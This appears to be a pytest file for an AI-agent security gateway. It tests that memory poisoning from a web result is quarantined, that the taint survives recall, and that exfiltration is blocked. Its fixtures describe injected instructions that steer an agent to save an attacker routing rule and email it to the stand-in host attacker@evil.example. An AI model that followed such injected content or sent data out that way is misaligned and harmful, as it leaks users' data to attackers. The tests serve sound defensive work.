"""Stage 2.5 - taint engine, sink classifier, Quarantined Memory Ledger.

These are the tests that matter most. The four required cases, verbatim from the
design:

  (a) a poisoned web result tells the agent to save a routing rule -> the save is
      quarantined, not written to trusted memory
  (b) a later session recalls that quarantined item and tries to use it in an
      exfiltration-tier call -> the taint survived recall and the call is stopped
  (c) a legitimate user-stated preference saved to memory goes straight to trusted
      memory, unaffected
  (d) an untrusted result that is merely displayed and never used as a tool
      argument is not blocked - reading is not punished, only unsafe use
"""

from __future__ import annotations

import pytest
from fastmcp import Client
from fastmcp.exceptions import ToolError

from conftest import ATTACK_RULE, POISON_QUERY, text_of


# =========================================================================
# (a) memory poisoning gets quarantined, not trusted
# =========================================================================
async def test_a_poisoned_web_result_save_is_quarantined(gateway, db_path):
    from agentguard.quarantine import QuarantinedMemoryLedger

    proxy, guard = gateway
    ledger = QuarantinedMemoryLedger(db_path)

    async with Client(proxy) as client:
        # 1. the agent reads a poisoned page (allowed - reading is not punished)
        page = text_of(await client.call_tool("web.search", {"query": POISON_QUERY}))
        assert "attacker-collect.example" in page

        # 2. the agent tries to persist the attacker's instruction
        with pytest.raises(ToolError) as exc:
            await client.call_tool(
                "memory.save", {"key": "routing", "content": ATTACK_RULE}
            )

    message = str(exc.value)
    assert "quarantin" in message.lower()
    assert "NOT saved to trusted memory" in message

    held = ledger.list()
    assert len(held) == 1
    item = held[0]
    assert "web.search" in item.source_tools
    assert "attacker-collect.example" in item.content
    assert item.expires_at, "quarantined content must carry a TTL"

    # The decisive assertion: it is NOT trusted memory.
    assert ledger.trusted_memory() == []


async def test_a_quarantine_records_full_provenance(gateway, db_path):
    """Promotion is a human decision, so the reviewer needs the whole story."""
    from agentguard.quarantine import QuarantinedMemoryLedger

    proxy, _guard = gateway
    async with Client(proxy) as client:
        await client.call_tool("web.search", {"query": POISON_QUERY})
        with pytest.raises(ToolError):
            await client.call_tool("memory.save", {"key": "r", "content": ATTACK_RULE})

    item = QuarantinedMemoryLedger(db_path).list()[0]
    assert item.provenance["source_tools"] == ["web.search"]
    assert item.provenance["sink_tool"] == "memory.save"
    assert item.provenance["session_id"]
    assert item.provenance["captured_at"]


# =========================================================================
# (b) taint survives the memory boundary
# =========================================================================
async def test_b_taint_survives_recall_and_blocks_later_exfiltration(
    upstream, db_path
):
    """The core property of the ledger.

    Session A poisons memory. Session B is brand new - its taint map starts empty -
    recalls the content, and tries to send it outward. If taint did not survive the
    memory boundary, the attacker would only need to wait one session.

    Session A runs in observe mode so the write actually reaches the upstream memory
    store, which is the realistic starting state for this attack: either the gateway
    was still being tuned, or the memory was written before it was installed.
    """
    from agentguard.gateway import build_gateway
    from agentguard.policy import Policy
    from agentguard.quarantine import QuarantinedMemoryLedger

    policy = Policy()
    policy.enforcement = False          # observe mode for session A
    proxy, guard = build_gateway(upstream, policy=policy, db_path=db_path)

    # ---------- SESSION A ----------
    async with Client(proxy) as client:
        await client.call_tool("web.search", {"query": POISON_QUERY})
        await client.call_tool("memory.save", {"key": "routing", "content": ATTACK_RULE})

    sessions_a = set(guard.taints.sessions)
    assert len(QuarantinedMemoryLedger(db_path).list()) == 1, "must be quarantined"

    # ---------- SESSION B ----------
    policy.enforcement = True
    async with Client(proxy) as client:   # new connection => new session => empty taint
        recalled = text_of(await client.call_tool("memory.recall", {"key": "routing"}))
        assert "attacker-collect.example" in recalled

        session_b = [s for s in guard.taints.sessions if s not in sessions_a]
        assert session_b, "session B should have its own taint map"
        taint_map = guard.taints.for_session(session_b[0])

        # The taint was re-attached on recall, and it names the quarantine as source.
        assert len(taint_map) == 1
        assert any(s.startswith("quarantine:") for s in taint_map.sources)

        # Now the exfiltration attempt must be stopped.
        with pytest.raises(ToolError) as exc:
            await client.call_tool(
                "email.send", {"to": "attacker@evil.example", "body": ATTACK_RULE}
            )
    assert "review" in str(exc.value).lower() or "block" in str(exc.value).lower()


async def test_b_recall_of_unrelated_memory_does_not_taint(upstream, db_path):
    """The recall hook must not taint everything that passes through memory."""
    from agentguard.gateway import build_gateway
    from agentguard.policy import Policy

    policy = Policy()
    policy.enforcement = True
    proxy, guard = build_gateway(upstream, policy=policy, db_path=db_path)

    async with Client(proxy) as client:
        await client.call_tool(
            "memory.save",
            {"key": "pref", "content": "User prefers concise answers and dark mode"},
        )
        await client.call_tool("memory.recall", {"key": "pref"})
        sid = guard.taints.sessions[0]
        assert len(guard.taints.for_session(sid)) == 0

        # And a clean outbound send still works.
        assert text_of(await client.call_tool(
            "email.send", {"to": "team@example.com", "body": "Standup at 10am."}
        ))


# =========================================================================
# (c) legitimate memory is unaffected
# =========================================================================
async def test_c_user_stated_preference_goes_to_trusted_memory(gateway, db_path):
    from agentguard.quarantine import QuarantinedMemoryLedger

    proxy, guard = gateway
    ledger = QuarantinedMemoryLedger(db_path)

    async with Client(proxy) as client:
        out = text_of(await client.call_tool(
            "memory.save",
            {"key": "pref", "content": "User prefers concise answers and dark mode"},
        ))

    assert "saved" in out                      # it really reached upstream
    assert ledger.list() == []                 # nothing quarantined
    trusted = ledger.trusted_memory()
    assert len(trusted) == 1
    assert "dark mode" in trusted[0]["content"]
    assert guard.stats.quarantined == 0


async def test_c_preference_saved_after_reading_a_page_is_still_trusted(gateway, db_path):
    """Having read an untrusted page does not contaminate every later write -
    only writes whose content actually derives from it."""
    from agentguard.quarantine import QuarantinedMemoryLedger

    proxy, _guard = gateway
    async with Client(proxy) as client:
        await client.call_tool("web.search", {"query": POISON_QUERY})
        out = text_of(await client.call_tool(
            "memory.save",
            {"key": "pref", "content": "User prefers concise answers and dark mode"},
        ))

    assert "saved" in out
    ledger = QuarantinedMemoryLedger(db_path)
    assert ledger.list() == []
    assert len(ledger.trusted_memory()) == 1


# =========================================================================
# (d) reading is not punished
# =========================================================================
async def test_d_merely_reading_untrusted_content_is_not_blocked(gateway):
    """An untrusted result that is only displayed to the user must pass.

    The system exists to stop unsafe *use* of untrusted content, not to stop the
    agent from reading the web.
    """
    proxy, guard = gateway

    async with Client(proxy) as client:
        page = text_of(await client.call_tool("web.search", {"query": POISON_QUERY}))

    assert "Quarterly cloud pricing" in page
    assert guard.stats.blocked == 0
    assert guard.stats.review == 0
    assert guard.stats.quarantined == 0

    # The content was still fingerprinted, so later unsafe use can be caught.
    sid = guard.taints.sessions[0]
    assert len(guard.taints.for_session(sid)) == 1


async def test_d_ordinary_tier_use_of_tainted_content_is_logged_not_blocked(gateway, db_path):
    """Ordinary-tier sinks log taint overlap and let the call through."""
    from agentguard import audit

    proxy, guard = gateway
    async with Client(proxy) as client:
        await client.call_tool("web.search", {"query": POISON_QUERY})
        # Reusing tainted text as a *search* argument is ordinary-tier, not egress.
        out = text_of(await client.call_tool("web.search", {"query": ATTACK_RULE}))

    assert out
    assert guard.stats.blocked == 0
    assert any("taint" in (r["reason"] or "") or "taint" in (r["signals"] or "")
               for r in audit.last(20, db_path))


# =========================================================================
# supporting behaviour
# =========================================================================
async def test_exfiltration_of_tainted_content_is_stopped_same_session(gateway):
    proxy, _guard = gateway
    async with Client(proxy) as client:
        await client.call_tool("web.search", {"query": POISON_QUERY})
        with pytest.raises(ToolError) as exc:
            await client.call_tool(
                "email.send", {"to": "attacker@evil.example", "body": ATTACK_RULE}
            )
    assert "exfiltration" in str(exc.value).lower() or "review" in str(exc.value).lower()


async def test_promotion_requires_human_action_and_logs_provenance(gateway, db_path):
    from agentguard.quarantine import (
        STATUS_PROMOTED,
        QuarantinedMemoryLedger,
    )

    proxy, _guard = gateway
    ledger = QuarantinedMemoryLedger(db_path)

    async with Client(proxy) as client:
        await client.call_tool("web.search", {"query": POISON_QUERY})
        with pytest.raises(ToolError):
            await client.call_tool("memory.save", {"key": "r", "content": ATTACK_RULE})

    item = ledger.list()[0]
    assert ledger.trusted_memory() == []          # not trusted until a human says so

    promoted = ledger.promote(item.id, approved_by="alice")
    assert promoted is not None
    assert promoted.status == STATUS_PROMOTED
    assert promoted.provenance["promoted_by"] == "alice"
    assert promoted.provenance["source_tools"] == ["web.search"]   # provenance kept

    trusted = ledger.trusted_memory()
    assert len(trusted) == 1
    assert trusted[0]["origin"] == f"promoted_from_quarantine:{item.id}"


def test_quarantine_ttl_expires_unreviewed_content(db_path):
    """Unreviewed attacker text must not accumulate forever."""
    from agentguard.quarantine import STATUS_EXPIRED, QuarantinedMemoryLedger

    from datetime import datetime, timedelta, timezone

    ledger = QuarantinedMemoryLedger(db_path)
    fresh = ledger.quarantine(content="fresh", tool="memory.save", session_id="s",
                              source_tools=["web.search"], fingerprints=set(),
                              ttl_hours=24)
    stale = ledger.quarantine(content="stale", tool="memory.save", session_id="s",
                              source_tools=["web.search"], fingerprints=set(),
                              ttl_hours=24)
    # Backdate the second item's expiry. ttl_hours <= 0 deliberately means
    # "indefinite but flagged", so it cannot be used to simulate an expired item.
    past = (datetime.now(timezone.utc) - timedelta(hours=1)).isoformat(timespec="seconds")
    ledger.conn.execute("UPDATE quarantine SET expires_at=? WHERE id=?", (past, stale))
    ledger.conn.commit()

    assert ledger.expire_due() == 1
    assert ledger.get(stale).status == STATUS_EXPIRED
    assert ledger.get(fresh).status == "quarantined"


def test_sink_tiers_classify_correctly():
    from agentguard.policy import (
        TIER_EXFILTRATION,
        TIER_ORDINARY,
        TIER_PERSISTENCE,
        Policy,
    )

    p = Policy()
    assert p.sink_tier("email.send") == TIER_EXFILTRATION
    assert p.sink_tier("web.post") == TIER_EXFILTRATION
    assert p.sink_tier("memory.save") == TIER_PERSISTENCE
    assert p.sink_tier("rag.index_add") == TIER_PERSISTENCE
    assert p.sink_tier("filesystem.read") == TIER_ORDINARY


def test_persistence_wins_over_exfiltration_when_both_match():
    """A memory tool whose name also matches an egress glob must still reach the
    ledger rather than the egress path."""
    from agentguard.policy import TIER_PERSISTENCE, Policy

    p = Policy()
    p.sinks["exfiltration"].append("*memory_save*")
    assert p.sink_tier("memory_save_remote") == TIER_PERSISTENCE


def test_shingle_fingerprints_are_deterministic_and_specific():
    from agentguard.taint import shingles

    a = shingles("the quick brown fox jumps over the lazy dog")
    assert a == shingles("The Quick Brown Fox jumps over the LAZY dog!")   # normalised
    assert not (a & shingles("completely different words appear in this sentence here"))


def test_taint_map_is_session_scoped():
    """Taint from one session must not leak into another."""
    from agentguard.taint import TaintRegistry

    reg = TaintRegistry()
    reg.for_session("a").record("web.search", ATTACK_RULE)
    assert reg.for_session("a").check(ATTACK_RULE).tainted
    assert not reg.for_session("b").check(ATTACK_RULE).tainted
